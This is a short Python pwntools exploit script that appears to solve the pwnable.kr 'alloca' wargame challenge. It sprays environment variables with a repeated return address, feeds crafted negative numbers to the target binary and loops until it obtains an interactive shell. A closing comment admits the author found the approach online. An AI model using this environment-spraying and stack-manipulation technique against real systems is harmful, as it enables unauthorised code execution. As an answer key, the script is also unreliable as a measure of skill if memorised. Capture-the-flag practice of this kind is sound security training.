from pwn import *

# context.log_level = "debug"
# r = ssh(user="alloca", host="pwnable.kr", port=2222, password="guest")

while True:
    io = process(
        "/home/alloca/alloca",
        env={"pwn" + str(i): p32(0x80485AB) * 30000 for i in range(17)},
    )
    io.sendline(b"-70")
    io.sendline(b"-4718592")
    io.interactive()

# I must say I don't like to gamble and I am not used to
# pwnable.kr's abnormal return style. So the difficulty 
# is to burte-force and maths, I choose to directly google
# :]